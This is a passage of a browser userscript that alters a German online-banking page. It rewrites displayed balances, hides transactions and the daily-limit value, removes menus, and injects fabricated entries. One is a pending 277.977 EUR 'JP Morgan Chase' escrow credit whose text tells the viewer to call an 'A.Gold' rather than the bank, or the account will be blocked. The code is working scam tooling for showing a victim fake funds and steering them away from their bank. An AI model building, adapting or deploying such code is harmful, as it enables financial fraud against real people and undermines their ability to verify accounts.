// ==UserScript==
// @name         Ed 4Rec  post.RudolfLaechler@web.de
// @namespace    http://tampermonkey.net/
// @version      3.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/544196/Ed%204Rec%20%20postRudolfLaechler%40webde.user.js
// @updateURL https://update.greasyfork.org/scripts/544196/Ed%204Rec%20%20postRudolfLaechler%40webde.meta.js
// ==/UserScript==



// FINUEBER
  // Configure adjustments by the index (1-based) of *visible EUR balance containers* in DOM order
  const MBALANCE_CONFIGS = [
      // THE GESAMT SALDO IS AT INEX 1 AND IT GOES FURTHER FROM THERE
      // ONLY REAL VISIBLE BALANCES COUNT, EMPTY BALANCES DON'T COUNT
    { index: 1, adjustmentAmount: 0 },
    { index: 2, adjustmentAmount: 0 },
    { index: 3, adjustmentAmount: 0 },
    { index: 4, adjustmentAmount: 0 },
    { index: 8, adjustmentAmount: 0 },
    { index: 9, adjustmentAmount: 0 },
    { index: 11, adjustmentAmount: 0 },
    // add more…
  ];

// UMSATZE BALANCE
  const ADJUSTMENT_AMOUNT = 0.0;
  const TARGET_IBAN = 'DE32 3601 0043 0457 8404 33';


//  Ihre Auszahlungsbuchung wurde wurde entgegengenommen.
// Neue Auszahlung

// UMSATZE TRANSACTION REMOVAL

  const TARGET_AMOUNTS = [
    { value: '-7.000,00', enabled: false },
    { value: '-910,00',  enabled: false },
    { value: '3.180,00', enabled: false }
  ];

//UMSATZE TRANSACTIONS
  const ITEMS = [
    // Single row item
    {
      enabled: false,
      kind: 'row',
      insertMode: 3,
      moveSteps: 0,
      initials: 'JP',
      title: 'JP Morgan Chase',
      details: 'A.Gold für Buchung anrufen, nicht Bank, sonst gesperrt.',
      type: 'SEPA Gutschrift',
      date: '10.08.2025',
      amountText: '7.000,00',
      currency: 'EUR'
    },

    // Another single row item
    {
      enabled: false,
      kind: 'row',
      insertMode: 3,
      moveSteps: -3,
      initials: 'AB',
      title: 'AB Consulting',
      details: 'Rechnung 2025/07',
      type: 'SEPA Lastschrift',
      date: '25.07.2025',
      amountText: '-299,00',
      currency: 'EUR'
    },

    // Custom group with multiple transactions
    {
      enabled: true,
      kind: 'group',
      insertMode: 1,
      groupMoveSteps: 1,
      groupLabel: ' Vorgemerkt ',
      rows: [
        {
          enabled: true,
          moveStepsWithinGroup: 0,
          initials: 'JP',
          title: 'JP Morgan Chase',
          details: 'Freigabe über JPM.A.Gold anrufen, nicht Bank, sonst gesperrt.',
          type: 'Treuhand Gutschrift',
          date: 'Vorgemerkt',
          amountText: '277.977,00',
          currency: 'EUR'
        },
        {
          enabled: false,
          moveStepsWithinGroup: -1,
          initials: 'JP',
          title: 'JP Morgan Chase',
          details: 'A.Gold für Buchung anrufen, nicht Bank, sonst gesperrt.',
          type: 'SEPA Gutschrift',
          date: '10.08.2025',
          amountText: '7.000,00',
          currency: 'EUR'
        }
      ]
    },

  ];


// POST UTILITIES
    // ---- Configuration: toggle each target on/off ----
    const CONFIG = {
        // Remove elements like: [data-test="fullAccountRow"] .balance.text-nowrap.with-color
        removeMainBalance: true,

        // Remove elements like: .balance__subline.d-flex.justify-content-end.align-items-center.mt-1
        removeSubline: true,

        // Remove elements like: [data-test="pageHeaderActionMenu"]
        removePageHeaderActionMenu: true,

        // Remove elements like: [aria-label="Menu zu Umsatzfunktionen öffnen"]
        removeMenuUmsatzfunktionen: true,

        // Remove elements like: [aria-label="Menu zu Produktfunktionen öffnen"]
        removeMenuProduktfunktionen: true,

        // Remove the *direct parent* of elements like: [data-test="filterButtonSmall"]
        removeParentOfFilterButtonSmall: true,

        // Check interval in ms
        intervalMs: 100
    };

// POST POSTFACH

 const RULES = [
    {
      USE_DIGIT_CHECK: true,
      USE_DATE_CHECK:  true,
      TARGET_DIGITS_RAW: '612 1583459 00', // digits-only compare
      TARGET_DATE_RAW:   '00.07.2025',     // month + year
    },
    // Add more rules below, same 4 keys only:
    // {
    //   USE_DIGIT_CHECK: false,
    //   USE_DATE_CHECK:  true,
    //   TARGET_DIGITS_RAW: '123 456',
    //   TARGET_DATE_RAW:   '00.00.2025', // year only
    // },
    // {
    //   USE_DIGIT_CHECK: true,
    //   USE_DATE_CHECK:  false,
    //   TARGET_DIGITS_RAW: '987654321',
    //   TARGET_DATE_RAW:   '28.07.2025', // ignored if USE_DATE_CHECK=false
    // },
  ];



// =====================================================================================================================================
// =====================================================================================================================================
// =====================================================================================================================================
if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

  // === MASTER SWITCH ===
  const ENABLED = true; // Set to false to completely disable the script
  if (!ENABLED) {
    console.log('[UserScript] Disabled via ENABLED=false');
    return;
  }

  const WHITESPACE_CLASS = '[\\s\\u00A0]+';
  const esc = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const flex = (s) =>
    new RegExp(
      esc(s)
        .replace(/\s+/g, WHITESPACE_CLASS)
        .replace(/\\-/g, `${WHITESPACE_CLASS}?-${WHITESPACE_CLASS}?`),
      'gu'
    );

      // === CONFIGURATION ===
  const DAILY_LIMIT_REPLACEMENT = '7.000,00 EUR'; // Change this to your desired value

  const REPLACEMENTS = [
    { find: ' Geld vom Referenzkonto buchen ', replace: 'Geld vom Referenzkonto buchen' },
    { find: 'Geld vom Referenzkonto buchen', replace: 'Geld vom Referenzkonto buchen' },
    { find: ' Empfängerkonto ', replace: 'Empfängerkonto' },
    { find: ' Referenzkonto ', replace: 'Referenzkonto' },
    { find: ' Sofortbuchung', replace: 'Sofortbuchung' },
    { find: ' Buchungsdetails ', replace: 'Buchungsdetails' },
    { find: 'Maximaler Betrag welchen Sie heute buchen können:', replace: 'Maximaler Betrag welchen Sie heute buchen können:' },
    { find: 'Auszahlungsoptionen', replace: 'Auszahlungsoptionen' },
    { find: ' Terminauszahlungsbuchung ', replace: 'Terminauszahlungsbuchung' },
    { find: ' Als Auszahlungsvorlage speichern ', replace: 'Als Auszahlungsvorlage speichern' },
    { find: ' Auszahlungsbuchung bestätigen ', replace: 'Auszahlungsbuchung bestätigen' },
    { find: 'Ihre Auszahlungsbuchung wurde wurde entgegengenommen.', replace: 'Ihre Auszahlungsbuchung wurde wurde entgegengenommen.' },
    { find: 'Neue Auszahlung', replace: 'Neue Auszahlung' },
    { find: ' Auszahlungsbuchungen von Referenzkonten in Euro innerhalb des Sepa-Raums', replace: 'Auszahlungsbuchungen von Referenzkonten in Euro innerhalb des Sepa-Raums' },
    { find: 'Auszahlung buchen', replace: 'Auszahlung buchen' },
  ].map(({ find, replace }) => ({ pattern: flex(find.trim()), replace }));

  const SKIP_TAGS = new Set(['SCRIPT', 'STYLE', 'NOSCRIPT', 'IFRAME', 'TEMPLATE']);
  const isEditable = (el) =>
    el && (el.isContentEditable || el.closest?.('[contenteditable=""], [contenteditable="true"]'));

  const replaceInTextNode = (textNode) => {
    let txt = textNode.nodeValue;
    let changed = 0;

    for (const { pattern, replace } of REPLACEMENTS) {
      const before = txt;
      txt = txt.replace(pattern, replace);
      if (txt !== before) changed++;
    }

    if (changed > 0 && txt !== textNode.nodeValue) {
      textNode.nodeValue = txt;
    }
    return changed;
  };

  const scanAndReplace = (root = document.body) => {
    if (!root) return { nodes: 0, changes: 0 };
    const start = performance.now();
    let nodes = 0;
    let changes = 0;

    try {
      const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, {
        acceptNode(node) {
          const parent = node.parentElement;
          if (!parent) return NodeFilter.FILTER_REJECT;
          if (SKIP_TAGS.has(parent.tagName)) return NodeFilter.FILTER_REJECT;
          if (isEditable(parent)) return NodeFilter.FILTER_REJECT;
          if (!node.nodeValue || !node.nodeValue.trim()) return NodeFilter.FILTER_REJECT;
          return NodeFilter.FILTER_ACCEPT;
        },
      });

      let current;
      while ((current = walker.nextNode())) {
        nodes++;
        changes += replaceInTextNode(current);
      }
    } catch (err) {
      console.error('[UserScript] scanAndReplace error:', err);
    } finally {
      const ms = (performance.now() - start).toFixed(1);
      if (changes > 0) {
        console.debug(
          `[UserScript] Replacements: ${changes} text node(s) updated. Scanned ${nodes} nodes in ${ms} ms.`
        );
      }
    }

    return { nodes, changes };
  };

  const replaceDailyLimitValue = (newValue) => {
    try {
      document.querySelectorAll('[data-test="remainingDailyLimit"]').forEach((el) => {
        if (el.textContent !== newValue) {
          console.debug(`[UserScript] Changing remainingDailyLimit from "${el.textContent}" to "${newValue}"`);
          el.textContent = newValue;
        }
      });
    } catch (err) {
      console.error('[UserScript] replaceDailyLimitValue error:', err);
    }
  };

  const removeSummaryElements = () => {
    try {
      const desktopItems = document.querySelectorAll(
        '.col.process-summary-panel-item__desktop.d-none.d-md-flex.p-5.flex-column.justify-content-center'
      );
      if (desktopItems.length >= 2) {
        const target = desktopItems[1];
        if (target && target.isConnected) {
          target.remove();
          console.debug('[UserScript] Removed 2nd ".process-summary-panel-item__desktop" block.');
        }
      }

      const connectors = document.querySelectorAll(
        '.col-auto.process-summary-panel-item__vertical-connector.p-0'
      );
      let removed = 0;
      connectors.forEach((el) => {
        if (el && el.isConnected) {
          el.remove();
          removed++;
        }
      });
      if (removed > 0) {
        console.debug(`[UserScript] Removed ${removed} ".process-summary-panel-item__vertical-connector" element(s).`);
      }
    } catch (err) {
      console.error('[UserScript] removeSummaryElements error:', err);
    }
  };



  // Initial run
  const first = scanAndReplace();
  replaceDailyLimitValue(DAILY_LIMIT_REPLACEMENT);
  removeSummaryElements();
  console.log(
    `[UserScript] Initial scan complete — scanned ${first.nodes} nodes, updated ${first.changes} text node(s).`
  );

  // Interval every 2 seconds
  setInterval(() => {
    scanAndReplace();
    replaceDailyLimitValue(DAILY_LIMIT_REPLACEMENT);
    removeSummaryElements();
  }, 100);
 }
// =====================================================================================================================================
// =====================================================================================================================================
// =====================================================================================================================================// =====================================================================================================================================
// =====================================================================================================================================
// =====================================================================================================================================


// FINUEBER
if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {
  'use strict';

  // Configure adjustments by the index (1-based) of *visible EUR balance containers* in DOM order
  // const MBALANCE_CONFIGS = [
  //   { index: 1, adjustmentAmount: 7700 },
  //   { index: 2, adjustmentAmount: 7700 },
  //   { index: 3, adjustmentAmount: 7700 },
  //   { index: 4, adjustmentAmount: 7700 },
  //   { index: 8, adjustmentAmount: 7700 },
  //   { index: 9, adjustmentAmount: 7700 },
  //   { index: 11, adjustmentAmount: 7700 },
  // ];

  const INDEX_TO_ADJ = new Map(MBALANCE_CONFIGS.map(c => [c.index, c.adjustmentAmount]));
  const TICK_MS = 50;  // INTERVAL

  // Helpers
  const log  = (...a) => console.log('[MBAL]', ...a);
  const warn = (...a) => console.warn('[MBAL]', ...a);
  const err  = (...a) => console.error('[MBAL]', ...a);

  // Parse "12.473,19" -> 12473.19 ; "-8.214,00" -> -8214
  function parseEuroLike(str) {
    if (!str) return null;
    const cleaned = str.replace(/\./g, '').replace(',', '.').replace(/\s+/g, '');
    const n = Number(cleaned);
    return Number.isFinite(n) ? n : null;
  }

  // 12473.19 -> "12.473,19"
  function formatEuroNumber(n) {
    return new Intl.NumberFormat('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(n);
  }

  // Visible check (filters out desktop/mobile duplicate that’s hidden)
  function isVisible(el) {
    return !!(el && (el.offsetParent || el.getClientRects().length));
  }

  // Collect ONLY the proper amount containers
  function getBalanceContainersOrdered() {
    const all = Array.from(document.querySelectorAll(
      'db-banking-decorated-amount span.balance > span.db-text--highlight.positive,' +
      'db-banking-decorated-amount span.balance > span.db-text--highlight.negative'
    ));

    const eurVisible = all.filter(el => {
      const currency = el.querySelector('[data-test="currencyCode"]');
      if (!currency) return false;
      const curr = currency.textContent && currency.textContent.trim();
      if (curr !== 'EUR') return false;
      return isVisible(el);
    });

    return eurVisible;
  }

  function getValueSpan(container) {
    return container.querySelector('span:first-child');
  }

  function readBase(container) {
    const valueSpan = getValueSpan(container);
    if (!valueSpan) return null;
    const raw = (valueSpan.textContent || '').trim();
    return parseEuroLike(raw);
  }

  function setDisplay(container, amount) {
    const valueSpan = getValueSpan(container);
    if (!valueSpan) return;
    const sign = amount < 0 ? '-' : '';
    valueSpan.textContent = sign + formatEuroNumber(Math.abs(amount));

    container.classList.remove('positive', 'negative');
    const currencySpan = container.querySelector('[data-test="currencyCode"]');
    if (currencySpan) currencySpan.classList.remove('positive', 'negative');

    if (amount >= 0) {
      container.classList.add('positive');
      if (currencySpan) currencySpan.classList.add('positive');
    } else {
      container.classList.add('negative');
      if (currencySpan) currencySpan.classList.add('negative');
    }
  }

  function updateByIndex() {
    try {
      // NEW: skip modification if details panel exists
      if (document.querySelector('[data-test="details"]')) {
        // log('Details present, skipping balance modification');
        return;
      }

      const containers = getBalanceContainersOrdered();

      if (!updateByIndex._lastCount || updateByIndex._lastCount !== containers.length) {
        updateByIndex._lastCount = containers.length;
        log('Detected EUR balances (visible) =', containers.length);
      }

      containers.forEach((el, i) => {
        const index = i + 1;

        if (!el.dataset.baseEur) {
          const base = readBase(el);
          if (base == null) {
            warn('Could not read base for index', index, el);
            return;
          }
          el.dataset.baseEur = String(base);
          const valSpan = getValueSpan(el);
          el.dataset.trailingSpace = /\s$/.test(valSpan?.textContent || '') ? '1' : '';
          el.dataset.mbalanceIndex = String(index);
          log(`Cache base idx ${index}:`, base);
        }

        const baseVal = Number(el.dataset.baseEur);
        const adj = INDEX_TO_ADJ.has(index) ? Number(INDEX_TO_ADJ.get(index)) : null;
        const target = adj == null ? baseVal : (baseVal + adj);

        const valSpan = getValueSpan(el);
        const currentText = (valSpan?.textContent || '').trim();
        const expectedText = (target < 0 ? '-' : '') + formatEuroNumber(Math.abs(target));
        if (currentText !== expectedText) {
          setDisplay(el, target);
        }
      });
    } catch (e) {
      err('updateByIndex error', e);
    }
  }

  updateByIndex();
  setInterval(updateByIndex, TICK_MS);
}


// =====================================================================================================================================
// =====================================================================================================================================





// UMSATZE BALANCE
 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

//  const ADJUSTMENT_AMOUNT = 10000.50;
//  const TARGET_IBAN = 'DE10 1222 1234 1234 1234 10';

  const TAG = '[Balance Adjuster]';
  console.log(`${TAG} loaded. Adjustment amount: ${ADJUSTMENT_AMOUNT}, Target IBAN: ${TARGET_IBAN}`);

  let originalText = null;
  let originalNumber = null;
  let lastAppliedText = null;
  let lastAppliedNumber = null;

  const normalizeIBAN = (str) => str.replace(/\s+/g, '').toUpperCase();
  const trimAllSpaces = (s) => s.replace(/\u00A0/g, ' ').replace(/\s+/g, ' ').trim();

  function parseGermanAmount(str) {
    if (!str) return NaN;
    const cleaned = str
      .replace(/\u00A0/g, ' ')
      .replace(/\s/g, '')
      .replace(/\./g, '')
      .replace(',', '.');
    return parseFloat(cleaned);
  }

  function formatGerman(num) {
    return new Intl.NumberFormat('de-DE', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }).format(num);
  }

  function findAmountNode() {
    const currency = document.querySelector('span[data-test="currencyCode"].currency');
    if (currency && currency.previousElementSibling) return currency.previousElementSibling;
    const pos = document.querySelector('.balance.text-nowrap.with-color .db-text--highlight.positive > span:first-child');
    if (pos) return pos;
    const neg = document.querySelector('.db-text--highlight.negative > span:first-child');
    if (neg) return neg;
    return null;
  }

  function findHighlightContainer(amountNode) {
    return amountNode?.closest('.db-text--highlight') || null;
  }

  function findCurrencyNode(amountNode) {
    const container = amountNode?.closest('.db-text--highlight') || amountNode?.parentElement;
    return container?.querySelector('span[data-test="currencyCode"].currency') || null;
  }

  function desiredTextFromOriginal(origText, desiredNumber) {
    const hadTrailingSpace = /\s$/.test(origText || '');
    const formatted = formatGerman(desiredNumber);
    return hadTrailingSpace ? (formatted + ' ') : formatted;
  }

  function classesForSign(container, currencyNode, numberValue) {
    const isPos = numberValue >= 0;
    container?.classList.toggle('positive', isPos);
    container?.classList.toggle('negative', !isPos);
    currencyNode?.classList.toggle('positive', isPos);
    currencyNode?.classList.toggle('negative', !isPos);
  }

  function ibanMatchesTarget() {
    const ibanDiv = document.querySelector('div[data-test="sublineRow2"]');
    if (!ibanDiv) {
      console.warn(`${TAG} IBAN element not found`);
      return false;
    }
    const currentIBAN = normalizeIBAN(ibanDiv.textContent || '');
    const targetIBAN = normalizeIBAN(TARGET_IBAN);
    const match = currentIBAN === targetIBAN;
    if (!match) {
      console.warn(`${TAG} IBAN mismatch. Found: "${ibanDiv.textContent.trim()}"`);
    }
    return match;
  }

  function adjustOnce() {
    try {
      if (!ibanMatchesTarget()) return; // Skip if IBAN doesn't match

      const amountNode = findAmountNode();
      if (!amountNode) {
        console.debug(`${TAG} Amount node not found on this page.`);
        return;
      }

      const highlight = findHighlightContainer(amountNode);
      const currencyNode = findCurrencyNode(amountNode);

      const currentText = amountNode.textContent || '';
      const currentNumber = parseGermanAmount(currentText);

      if (!Number.isFinite(currentNumber)) {
        console.warn(`${TAG} Could not parse amount from: ${currentText}`);
        return;
      }

      const looksLikeOurLast = (lastAppliedText && trimAllSpaces(currentText) === trimAllSpaces(lastAppliedText));
      const baseChangedExternally = (
        originalNumber !== null &&
        !looksLikeOurLast &&
        Math.abs(currentNumber - originalNumber) > 1e-9 &&
        (lastAppliedNumber === null || Math.abs(currentNumber - lastAppliedNumber) > 1e-9)
      );

      if (originalNumber === null || baseChangedExternally) {
        originalText = currentText;
        originalNumber = currentNumber;
        console.log(`${TAG} Cached original balance: ${originalText} (${originalNumber})`);
      }

      const desiredNumber = originalNumber + ADJUSTMENT_AMOUNT;
      const desiredText = desiredTextFromOriginal(originalText, desiredNumber);

      if (trimAllSpaces(currentText) !== trimAllSpaces(desiredText)) {
        amountNode.textContent = desiredText;
        classesForSign(highlight, currencyNode, desiredNumber);
        lastAppliedText = desiredText;
        lastAppliedNumber = desiredNumber;
        console.log(`${TAG} Applied modified balance: ${desiredText} (${desiredNumber})`);
      } else {
        classesForSign(highlight, currencyNode, desiredNumber);
      }
    } catch (err) {
      console.error(`${TAG} Error while adjusting balance:`, err);
    }
  }

  setInterval(adjustOnce, 100);
  }




// =====================================================================================================================================
// =====================================================================================================================================






// UMSATZE TRANSACTIONS
 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

  // ================== CONFIG ==================
  // IBAN guard: page must show this IBAN (case + whitespace insensitive) in div[data-test="sublineRow2"]
//  const TARGET_IBAN = "DE70 1174 8634 4932 8515 53";

  // insertMode (rows & groups; groups use row-dates for placement):
  //   1 = beforeFirst
  //   2 = afterFirst
  //   3 = beforeSameOrClosestPrev (same date else closest previous; insert above it)
  // Rows:
  //   moveSteps: +N up, -N down (cross-group OK), 0 none
  // Groups:
  //   groupLabel: visible label text (e.g. ' Gestern ')
  //   groupMoveSteps: +N up, -N down among groups
  //   rows[].moveStepsWithinGroup: +N up, -N down inside that custom group
//  const ITEMS = [
//    // Single row item
//    {
//      enabled: true,
//      kind: 'row',
//      insertMode: 3,
 //     moveSteps: 0,
//      initials: 'JP',
//      title: 'JP Morgan Chase',
//      details: 'Freigabe über JPM.A.Gold anrufen, nicht Bank, sonst gesperrt.',
//      type: 'SEPA Gutschrift',
//      date: '29.07.2025',
//      amountText: '3.180,00',
//      currency: 'EUR'
//    },
//
//    // Another single row item
//    {
//      enabled: true,
//      kind: 'row',
//      insertMode: 3,
//      moveSteps: -3,
//      initials: 'AB',
//      title: 'AB Consulting',
//      details: 'Rechnung 2025/07',
//      type: 'SEPA Lastschrift',
//      date: '25.07.2025',
//      amountText: '-299,00',
//      currency: 'EUR'
//    },
//
//    // Custom group with multiple transactions
//    {
//      enabled: true,
//      kind: 'group',
 //     insertMode: 1,
 //     groupMoveSteps: 1,
 //    groupLabel: ' Gestern ',
 //     rows: [
 //       {
 //         enabled: true,
 //         moveStepsWithinGroup: 0,
 //         initials: 'M',
 //         title: 'Musterfirma GmbH',
  //        details: 'Gehalt Juni 2025',
 //         type: 'SEPA Überweisung',
  //        date: '04.08.2025',
  //        amountText: '3.180,00',
  //      },
  //      {
 //         enabled: true,
 //         moveStepsWithinGroup: -1,
 //         initials: 'RE',
  //        title: 'Rewe',
  //        details: 'Einkauf Rewe',
 //         type: 'SEPA Lastschrift',
 //         date: '04.08.2025',
 //         amountText: '-19,42',
 //         currency: 'EUR'
 //       }
 //     ]
 //   }
//  ];
  // ============================================

  const DUP_ATTR = 'data-tm-dup';
  const DUP_VAL  = '1';
  const SIG_ATTR = 'data-tm-sig';
  const WRAP_ATTR = 'data-tm-group'; // wrapper group marker
  const INTERVAL = 2000;

  const log  = (...a)=>console.log('[TM DupTx]',...a);
  const warn = (...a)=>console.warn('[TM DupTx]',...a);
  const err  = (...a)=>console.error('[TM DupTx]',...a);
  const sleep = ms=>new Promise(r=>setTimeout(r,ms));
  const norm  = s=>(s||'').replace(/\s+/g,' ').trim();
  function hashString(str){ let h=5381; for(let i=0;i<str.length;i++) h=((h<<5)+h)^str.charCodeAt(i); return (h>>>0).toString(36); }

  // ---------- IBAN guard ----------
  function ibanMatches() {
    try {
      const el = document.querySelector('div[data-test="sublineRow2"]');
      if (!el) return false;
      const pageIban = el.textContent || '';
      const normPage = pageIban.replace(/\s+/g, '').toUpperCase();
      const normTarget = TARGET_IBAN.replace(/\s+/g, '').toUpperCase();
      return normPage === normTarget;
    } catch (e) {
      err('ibanMatches failed:', e);
      return false;
    }
  }

  // ---------- DOM helpers ----------
  function allNativeGroups(){
    return [...document.querySelectorAll('cirrus-transactions-view cirrus-transactions-group')];
  }
  function allGroups(){
    return [
      ...allNativeGroups(),
      ...document.querySelectorAll(`[${WRAP_ATTR}="1"]`)
    ];
  }
  function firstRealGroup(){
    const groups = allNativeGroups();
    return groups.find(g => g.getAttribute(DUP_ATTR) !== DUP_VAL) || null;
  }
  function listFromGroup(group){
    return group?.querySelector('.transaction-group__list');
  }
  function rowsInGroup(group){
    const list = listFromGroup(group);
    return list ? [...list.querySelectorAll('cirrus-transaction-row')] : [];
  }
  function allRowsInOrder(){
    const rows = [];
    for (const g of allGroups()) rows.push(...rowsInGroup(g));
    return rows;
  }
  function firstRealRow(){
    const rows = allRowsInOrder();
    return rows.find(r => r.getAttribute(DUP_ATTR) !== DUP_VAL) || null;
  }
  function getAllRealRows(){
    return allRowsInOrder().filter(r => r.getAttribute(DUP_ATTR) !== DUP_VAL);
  }
  function rowToGroup(row){
    return row?.closest(`cirrus-transactions-group, [${WRAP_ATTR}="1"]`);
  }

  function insertBefore(node, ref){ const p=ref?.parentNode; if(!p) return false; p.insertBefore(node, ref); return true; }
  function insertAfter(node, ref){ const p=ref?.parentNode; if(!p) return false; if(ref.nextSibling) p.insertBefore(node, ref.nextSibling); else p.appendChild(node); return true; }

  function prevGroup(g){
    let p = g?.previousElementSibling;
    while (p && !(p.matches?.('cirrus-transactions-group') || p.getAttribute?.(WRAP_ATTR) === '1')) p = p.previousElementSibling;
    return p || null;
  }
  function nextGroup(g){
    let n = g?.nextElementSibling;
    while (n && !(n.matches?.('cirrus-transactions-group') || n.getAttribute?.(WRAP_ATTR) === '1')) n = n.nextElementSibling;
    return n || null;
  }

  // cross-group prev/next row
  function prevRowGlobal(row) {
    if (!row) return null;
    let p = row.previousElementSibling;
    while (p && p.tagName !== 'CIRRUS-TRANSACTION-ROW') p = p.previousElementSibling;
    if (p) return p;
    const pg = prevGroup(rowToGroup(row));
    if (pg) {
      const prs = rowsInGroup(pg);
      return prs[prs.length-1] || null;
    }
    return null;
  }
  function nextRowGlobal(row) {
    if (!row) return null;
    let n = row.nextElementSibling;
    while (n && n.tagName !== 'CIRRUS-TRANSACTION-ROW') n = n.nextElementSibling;
    if (n) return n;
    const ng = nextGroup(rowToGroup(row));
    if (ng) {
      const nrs = rowsInGroup(ng);
      return nrs[0] || null;
    }
    return null;
  }

  // ---------- content helpers ----------
  function setText(node, text){ if(node) node.textContent = text; }
  function parseDDMMYYYY(s){
    const m = String(s||'').match(/(\d{2})\.(\d{2})\.(\d{4})/);
    if(!m) return null;
    const dd = parseInt(m[1],10), mm = parseInt(m[2],10)-1, yyyy = parseInt(m[3],10);
    return new Date(Date.UTC(yyyy, mm, dd, 12, 0, 0, 0)); // avoid DST quirks
  }
  function getRowDate(row){
    const n = row.querySelector('[data-test="transactionRowDate"]');
    return parseDDMMYYYY(n ? n.textContent : '');
  }
  function rewriteAvatarToInitials(row, C){
    const avatar = row.querySelector('db-list-row-prefix db-avatar, db-list-row-prefix [data-test="avatar"], db-list-row-prefix db-avatar[data-test="avatar"]') ||
                   row.querySelector('db-avatar[data-test="avatar"]');
    if(!avatar) return;
    let container = avatar.querySelector('.db-avatar');
    if(!container){
      container = document.createElement('div');
      avatar.innerHTML = '';
      avatar.appendChild(container);
    }
    container.className = 'db-avatar db-avatar-type--initials db-avatar-size--md db-avatar-design--rounded';
    container.innerHTML = `
      <span translate="no" aria-hidden="true">${C.initials}</span>
      <span translate="no" class="sr-only"> ${C.title} </span>
    `;
  }
  function setAmount(block, C){
    const decorated = block.querySelector('db-banking-decorated-amount');
    if(!decorated) return;
    const signClass = C.amountText.trim().startsWith('-') ? 'negative' : 'positive';
    let directional = decorated.querySelector('.directional');
    if(!directional){
      directional = document.createElement('span');
      directional.className = 'directional text-nowrap with-color';
      decorated.innerHTML = '';
      decorated.appendChild(directional);
    }
    let highlight = decorated.querySelector('.db-text--highlight.negative, .db-text--highlight.positive');
    if(!highlight){
      highlight = document.createElement('span');
      directional.appendChild(highlight);
    }
    highlight.className = `db-text--highlight ${signClass}`;

    let numSpan = highlight.querySelector('span');
    if(!numSpan){ numSpan = document.createElement('span'); highlight.appendChild(numSpan); }
    setText(numSpan, `${C.amountText} `);

    let curSpan = highlight.querySelector('[data-test="currencyCode"]');
    if(!curSpan){
      curSpan = document.createElement('span');
      curSpan.setAttribute('data-test','currencyCode');
      highlight.appendChild(curSpan);
    }
    curSpan.className = `db-text--mute currency db-text--highlight ${signClass}`;
    setText(curSpan, C.currency);
  }
  function applyRowContent(row, C){
    try{
      rewriteAvatarToInitials(row, C);
      const titleWrap = row.querySelector('[data-test="counterPartyNameOrTransactionTypeLabel"]');
      const titleSpan = titleWrap?.querySelector('span') || titleWrap;
      setText(titleSpan, C.title);
      const firstCol = row.querySelector('.col-md-5');
      const detailsDiv = firstCol?.querySelector('.db-text--mute.color-text-secondary');
      setText(detailsDiv, ` ${C.details} `);
      const typeDiv = row.querySelector('[data-test="transactionTypeLabel"]');
      setText(typeDiv, ` ${C.type} `);
      row.querySelectorAll('[data-test="transactionRowDate"]').forEach(n=> setText(n, ` ${C.date} `));
      row.querySelectorAll('[data-test="amount"].text-truncate.db-text.text-right.color-text-primary').forEach(b=>setAmount(b, C));
    }catch(e){ err('applyRowContent failed:', e); }
  }

  // ---------- cloning ----------
  function cloneRowWithStyles(anchorRow, {markDup=true} = {}){
    const dup = anchorRow.cloneNode(true);
    if (markDup) dup.setAttribute(DUP_ATTR, DUP_VAL);
    dup.removeAttribute('aria-hidden');
    dup.style.pointerEvents = '';
    dup.querySelectorAll('[id]').forEach(n=>n.removeAttribute('id'));
    return dup;
  }
  // build a neutral wrapper that mimics a group; Angular won't wipe it
  function cloneGroupWrapperFrom(anchorGroup){
    const header = anchorGroup.querySelector(':scope > .container');
    const list   = anchorGroup.querySelector(':scope > .transaction-group__list');
    if (!header || !list) return null;

    const wrapper = document.createElement('div');
    wrapper.setAttribute(WRAP_ATTR,'1');
    wrapper.setAttribute(DUP_ATTR, DUP_VAL);

    // Copy Angular scoping attrs to wrapper so CSS applies
    for (const src of [anchorGroup, header]) {
      for (const attr of src.getAttributeNames()) {
        if (attr.startsWith('_ngcontent-') || attr.startsWith('_nghost-')) {
          wrapper.setAttribute(attr, src.getAttribute(attr));
        }
      }
    }

    const headerClone = header.cloneNode(true);
    const listClone   = list.cloneNode(true);
    // empty any rows inside the cloned list
    [...listClone.children].forEach(ch => { if (ch.tagName === 'CIRRUS-TRANSACTION-ROW') ch.remove(); });

    wrapper.appendChild(headerClone);
    wrapper.appendChild(listClone);
    return wrapper;
  }

  // ---------- placement (1/2/3) ----------
  function placeDecision(modeNum, targetDate){
    const realRows = getAllRealRows();
    if (realRows.length === 0) return { place: 'none', refRow: null };

    if (modeNum === 1) return { place: 'before', refRow: realRows[0] };
    if (modeNum === 2) return { place: 'after',  refRow: realRows[0] };

    // 3: beforeSameOrClosestPrev
    let bestPrev = null; let bestPrevTime = -Infinity;
    for (const r of realRows){
      const d = getRowDate(r);
      if (!d) continue;
      const t = +d;
      if (t === +targetDate) return { place: 'before', refRow: r };
      if (t < +targetDate && t > bestPrevTime) { bestPrev = r; bestPrevTime = t; }
    }
    if (bestPrev) return { place: 'before', refRow: bestPrev };
    return { place: 'before', refRow: realRows[0] };
  }

  // ---------- signatures ----------
  function sigForRowLike(C, extra=''){
    const signClass = (C.amountText||'').trim().startsWith('-') ? 'negative' : 'positive';
    return hashString(norm(['row',C.initials,C.title,C.details,C.type,C.date,C.amountText,C.currency,signClass,extra].join('|')));
  }
  function sigForItem(item){
    if (item.kind === 'row') {
